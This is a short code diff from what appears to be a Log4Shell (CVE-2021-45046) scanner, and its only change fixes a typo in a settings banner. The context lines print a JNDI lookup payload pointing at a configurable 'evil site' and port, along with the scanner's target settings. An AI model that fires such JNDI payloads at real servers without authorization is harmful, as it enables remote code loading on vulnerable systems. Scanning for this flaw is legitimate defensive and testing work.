@@ -257,7 +257,7 @@ def main():
     cprint('[*] CVE-2021-45046 with payload similar to ${jndi:ldap://127.0.0.1#' + _evil_site + ':' + _evil_port + '/a}', 'green')
     time.sleep(1)
     print('')
-    cprint('[+] ASM - Active Scanner Module - Settins', 'yellow', attrs=['bold'])
+    cprint('[+] ASM - Active Scanner Module - Settings', 'yellow', attrs=['bold'])
     cprint(f'[+] Url         {url_tmp}', 'yellow')
     cprint(f'[+] Evil_site   {_evil_site}', 'yellow')
     cprint(f'[+] Evil_port   {_evil_port}', 'yellow')
